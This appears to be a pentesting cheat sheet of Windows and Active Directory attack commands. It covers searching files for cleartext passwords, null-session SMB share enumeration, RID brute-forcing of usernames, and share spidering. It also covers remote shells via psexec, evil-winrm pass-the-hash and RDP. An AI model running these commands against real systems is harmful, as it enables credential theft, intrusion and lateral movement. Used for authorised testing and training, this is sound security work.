Check OS architecture / version:
```powershell
ver
wmic os get osarchitecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Get routes:
```powershell
route PRINT
```

Get running processes:

```powershell
tasklist /SVC
```

Get installed patches:

```powershell
wmic qfe
```

Search for cleartext passwords:
```powershell
findstr /si password *.txt
findstr /spin "password" *.*
```

Add domain NB name to /etc/hosts

```bash
crackmapexec smb $TARGET_IP -u '' -p ''
#check for open shares
crackmapexec smb $TARGET_IP -u '' -p '' --shares
```

Enumerate users by brute forcing RID
#rid #bruteforce-rid

```shell
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000
#extract usernames
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000 | grep -o '\\[^ ]*' | awk -F'\\' '{print $2}' | uniq
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M spider_plus --spider users
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Try to connect to console:

```shell
impacket-psexec $USER@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```


Port 3389 RDP:

```sh
xfreerdp /v:$TARGET_IP /u:$USER
```